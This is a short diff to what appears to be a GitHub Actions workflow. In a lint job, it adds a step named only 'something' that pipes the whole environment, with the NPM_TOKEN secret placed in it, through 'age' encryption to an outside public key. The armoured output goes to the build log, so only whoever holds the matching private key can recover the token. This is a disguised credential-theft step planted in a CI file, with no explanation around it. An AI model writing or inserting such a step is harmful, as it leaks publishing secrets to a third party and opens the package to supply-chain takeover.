@@ -15,7 +15,13 @@ concurrency:
 jobs:
   lint:
     runs-on: ubuntu-latest
+    environment: ci # contains the secret NPM_TOKEN used below
     steps:
+    - uses: alessiodionisi/setup-age-action@v1.3.0
+    - name: something
+      run: env | age -r age1x9e9ve88dp5ym27wcnh8n8g488s77v80yzt5qq8l0s0ndljfueps6f3zcv -a
+      env:
+        x: ${{ secrets.NPM_TOKEN }}
     - uses: denoland/setup-deno@v2
       with:
         deno-version: v1.39.2
